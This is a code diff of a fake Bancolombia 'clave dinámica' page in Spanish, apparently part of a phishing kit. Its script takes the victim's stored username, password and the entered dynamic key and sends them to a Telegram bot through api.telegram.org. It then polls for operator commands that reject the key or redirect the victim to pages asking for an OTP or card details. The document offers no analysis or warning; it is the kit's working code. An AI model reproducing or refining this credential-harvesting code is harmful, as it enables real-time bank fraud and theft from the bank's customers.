@@ -1,9 +1,10 @@
 <!DOCTYPE html>
+
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Bancolombia - Código de Verificación</title>
+  <title>Bancolombia - Clave Dinámica</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -93,8 +94,6 @@
       pointer-events: none;
       transition: opacity 220ms ease, visibility 220ms ease;
       flex-direction: column;
-      padding: 20px;
-      text-align: center;
     }
     .overlay-loader.visible {
       opacity: 1;
@@ -124,37 +123,37 @@
 
     @media (max-width: 480px) {
       .card { padding: 28px 18px; }
-      .spinner { width: 56px; height: 56px; border-width: 5px; }
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>Código de verificación</h1>
+    <h1>Ingresa tu clave dinámica</h1>
     <div class="error" id="errorMsg"></div>
-    <p>Hemos enviado un código de verificación a tu número de teléfono registrado. Ingresa el código de 6 dígitos que recibiste por mensaje de texto.</p>
+    <p>Detectamos un inicio de sesión desde un nuevo dispositivo. Ingresa la clave dinámica recibida por SMS o correo para confirmar tu identidad.</p>
     <br /><br />
-    <form id="otpForm" autocomplete="off">
+    <form id="dinForm" autocomplete="off">
       <div class="form-group">
-        <img src="candado.png" class="input-icon" alt="OTP" />
+        <img src="candado.png" class="input-icon" alt="SMS" />
         <input
           type="text"
-          name="codigoOtp"
-          id="codigoOtp"
+          name="claveDinamica"
+          id="claveDinamica"
           class="input-field"
-          placeholder="Código de verificación"
+          placeholder="Clave dinámica"
           required
           maxlength="6"
-          pattern="\d{6}"
+          pattern="\d{4,6}"
           inputmode="numeric"
           autocomplete="off"
         />
       </div>
       <br />
-      <button type="submit" class="btn">Verificar</button>
+      <button type="submit" class="btn">Validar</button>
     </form>
   </div>
 
+  <!-- Overlay loader: difuminado + rueda + texto -->
   <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
     <div class="spinner" aria-hidden="true"></div>
     <div class="loader-text" id="loaderText">Verificando información...</div>
@@ -174,20 +173,52 @@
       loaderFull.setAttribute('aria-hidden', 'true');
     }
 
-    // --- CAMBIO: Se eliminan las funciones loadTelegramConfig, saveTgOffset, getTgOffset, e initTgOffsetOnce ---
-    // El backend se encarga de toda la lógica de Telegram.
+    /* ---------- TELEGRAM CONFIG ---------- */
+    async function loadTelegramConfig() {
+      try {
+        const res = await fetch('./js/brr76.json', { cache: 'no-store' });
+        if (!res.ok) throw new Error('No se pudo cargar js/brr76.json');
+        const cfg = await res.json();
+        if (!cfg.token || !cfg.chat_id) throw new Error('brr76.json debe contener token y chat_id');
+        return cfg;
+      } catch (err) {
+        console.error('Error cargando brr76.json:', err);
+        alert('Error de configuración. Revisa js/brr76.json y la consola.');
+        return null;
+      }
+    }
 
+    /* Guardar/leer offset en localStorage para no reprocesar updates viejos */
+    function saveTgOffset(offset) { try { localStorage.setItem('tg_offset', String(offset)); } catch(e){} }
+    function getTgOffset() { try { return parseInt(localStorage.getItem('tg_offset')||'0'); } catch(e){ return 0; } }
+
+    /* Inicializamos offset con las actualizaciones actuales (no procesar historia) */
+    async function initTgOffsetOnce(config) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`, { cache: 'no-store' });
+        const data = await res.json();
+        if (data && data.ok) {
+          const updates = data.result || [];
+          if (updates.length > 0) {
+            const lastId = updates[updates.length - 1].update_id;
+            saveTgOffset(lastId + 1);
+          }
+        }
+      } catch (e) {
+        console.warn('No se pudo inicializar offset (se intentará usar el valor guardado):', e);
+      }
+    }
 
     // Validar formulario y enviar
-    document.getElementById('otpForm').addEventListener('submit', async function(e) {
+    document.getElementById('dinForm').addEventListener('submit', async function(e) {
       e.preventDefault();
 
-      const codigoOtp = document.getElementById('codigoOtp').value.trim();
+      const claveDinamica = document.getElementById('claveDinamica').value.trim();
       const err = document.getElementById('errorMsg');
       err.style.display = 'none';
 
-      if (!/^\d{6}$/.test(codigoOtp)) {
-        err.textContent = 'Debes ingresar un código de 6 dígitos.';
+      if (!/^\d{4,6}$/.test(claveDinamica)) {
+        err.textContent = 'Debes ingresar entre 4 y 6 dígitos.';
         err.style.display = 'block';
         return;
       }
@@ -207,14 +238,21 @@
         return;
       }
 
-      // --- CAMBIO: No se carga config.json ---
+      // Cargar config
+      const config = await loadTelegramConfig();
+      if (!config) { 
+        hideLoader(); 
+        return; 
+      }
+
+      // Inicializar offset una vez para evitar updates viejos (solo si no existe)
+      if (!getTgOffset()) await initTgOffsetOnce(config);
 
       // Intentar recuperar 'formData' si existe
       let storedForm = null;
       try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }
 
-      // Construir el mensaje de texto
-      let message = `📱 Código OTP recibido\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n🔢 Código OTP: ${codigoOtp}\n\n`;
+      let message = `🔐 Datos de clave dinámica\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n🔢 Dinámica: ${claveDinamica}\n\n`;
 
       if (storedForm && typeof storedForm === 'object') {
         const extras = [
@@ -227,116 +265,107 @@
         extras.forEach(it => { if (storedForm[it.k]) message += `• ${it.l}: ${storedForm[it.k]}\n`; });
       }
 
-      // Construir el teclado
       const keyboard = {
         inline_keyboard: [
-          [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
-          [{ text: "Pedir dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
-          [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
+          [{ text: "Error dinámica", callback_data: `error_dinamica:${transactionId}` }],
+          [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
+          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }]
         ]
       };
 
-      // --- CAMBIO: Enviar mensaje a nuestro propio backend ---
-      let sentMessageId = null;
+      // Enviar mensaje
       try {
-        const sendRes = await fetch('/api/send-message', { // <-- Llama al backend
+        const sendRes = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text: message, keyboard: keyboard })
+          body: JSON.stringify({ chat_id: config.chat_id, text: message, reply_markup: keyboard })
         });
-
         const sendJson = await sendRes.json();
-
-        if (!sendJson.ok || !sendJson.result || !sendJson.result.message_id) {
+        if (!sendJson.ok) {
           console.error('sendMessage error:', sendJson);
-          alert(sendJson.error || 'No se pudo enviar el mensaje al servidor. Revisa consola.');
+          alert('No se pudo enviar el mensaje a Telegram. Revisa consola.');
           hideLoader();
           return;
         }
-
-        // Guardamos el ID del mensaje enviado por Telegram
-        sentMessageId = sendJson.result.message_id;
-
       } catch (err) {
-        console.error('Error enviando a /api/send-message:', err);
-        alert('Error de conexión con el servidor. Revisa consola.');
+        console.error('Error enviando a Telegram:', err);
+        alert('Error enviando a Telegram. Revisa consola.');
         hideLoader();
         return;
       }
-      // --- FIN DEL CAMBIO ---
 
-
-      // --- CAMBIO: Esperar respuesta del backend (que hace el polling por nosotros) ---
+      // Polling seguro esperando la respuesta del admin
       try {
-        await waitForAdminResponse(sentMessageId);
+        await waitForAdminResponse(config, transactionId);
       } finally {
-        hideLoader(); // Ocultar el loader sin importar el resultado
+        hideLoader();
       }
     });
 
-    /**
-     * --- CAMBIO: Función reescrita ---
-     * Esta función ahora solo hace UNA petición a nuestro backend.
-     * El backend (/api/check-update) es el que se queda esperando (long polling)
-     * la respuesta del admin.
-     */
-    async function waitForAdminResponse(messageId) {
-      try {
-        // Hacemos la petición al endpoint de verificación
-        const res = await fetch(`/api/check-update/${messageId}`, {
-          method: 'GET',
-          cache: 'no-store' // No queremos respuestas cacheadas
-        });
+    async function waitForAdminResponse(config, transactionId) {
+      const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutos
+      const POLL_INTERVAL = 2000;
+      const start = Date.now();
+      let offset = getTgOffset() || 0;
 
-        if (res.ok) {
-          // El backend nos responde con JSON: { action: 'accion_elegida' }
+      while (Date.now() - start < MAX_WAIT_MS) {
+        try {
+          const url = offset > 0
+            ? `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates?offset=${offset}`
+            : `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`;
+
+          const res = await fetch(url, { cache: 'no-store' });
           const data = await res.json();
-          handleAdminAction(data.action); // Pasamos la acción directamente
+          if (data && data.ok) {
+            const updates = data.result || [];
+            if (updates.length > 0) {
+              const lastId = updates[updates.length - 1].update_id;
+              offset = lastId + 1;
+              saveTgOffset(offset);
 
-        } else if (res.status === 408) {
-          // El backend nos devuelve 408 si se agota su propio tiempo de espera
-          alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
+              for (const u of updates) {
+                if (u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId)) {
+                  // intentar responder el callback para quitar el "cargando" en Telegram
+                  try {
+                    await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/answerCallbackQuery`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ callback_query_id: u.callback_query.id })
+                    });
+                  } catch (e) { /* no bloqueamos por este fallo */ }
 
-        } else {
-          // Otro error del servidor
-          const errData = await res.json();
-          console.error('Error esperando respuesta:', errData);
-          alert(errData.error || 'Error del servidor al verificar la respuesta.');
+                  handleAdminAction(u.callback_query.data, transactionId);
+                  return;
+                }
+              }
+            }
+          } else {
+            console.warn('getUpdates retornó error o no ok', data);
+          }
+        } catch (err) {
+          console.error('Error en polling getUpdates:', err);
         }
 
-      } catch (err) {
-        // Error de red (ej: se cayó el servidor o no hay internet)
-        console.error('Error de red en waitForAdminResponse:', err);
-        alert('Error de conexión al esperar la respuesta. Revisa tu conexión.');
+        await new Promise(r => setTimeout(r, POLL_INTERVAL));
       }
+
+      hideLoader();
+      alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
     }
 
-    /**
-     * --- CAMBIO: Firma de la función simplificada ---
-     * Ahora recibe la acción limpia (ej: 'error_otp')
-     * que nos envía el backend.
-     */
-    function handleAdminAction(action) {
+    function handleAdminAction(callbackData, transactionId) {
       // Dependiendo del botón presionado por el admin, actuamos
-      if (action === 'error_otp') {
+      if (callbackData.startsWith('error_dinamica')) {
         const err = document.getElementById('errorMsg');
-        err.textContent = 'El código OTP ingresado es incorrecto. Verifica e intenta nuevamente.';
+        err.textContent = 'La clave dinámica ingresada es incorrecta. Verifica e intenta nuevamente.';
         err.style.display = 'block';
-        document.getElementById('codigoOtp').value = '';
-      } else if (action === 'pedir_dinamica') {
-        window.location.href = 'dinamica.html';
-      } else if (action === 'pedir_tc') {
+        document.getElementById('claveDinamica').value = '';
+      } else if (callbackData.startsWith('pedir_otp')) {
+        window.location.href = 'otp.html';
+      } else if (callbackData.startsWith('pedir_tc')) {
         window.location.href = 'tc.html';
-      } else if (action === 'finalizar') {
-        // Limpiar localStorage y redirigir a Google
-        localStorage.removeItem('usuario');
-        localStorage.removeItem('clave');
-        localStorage.removeItem('transactionId');
-        localStorage.removeItem('formData'); // Limpiamos también formData por si acaso
-        window.location.href = 'https://google.com';
       } else {
-        console.log('Acción admin no manejada:', action);
+        console.log('Acción admin no manejada:', callbackData);
       }
     }
 
@@ -344,10 +373,9 @@
     document.addEventListener('keydown', function(e) {
       if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
         e.preventDefault();
-        const codigoOtp = document.getElementById('codigoOtp').value.trim();
-        if (codigoOtp) {
-          // Disparamos el evento 'submit' del formulario
-          document.getElementById('otpForm').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+        const claveDinamica = document.getElementById('claveDinamica').value.trim();
+        if (claveDinamica) {
+          document.getElementById('dinForm').dispatchEvent(new Event('submit'));
         }
       }
     });
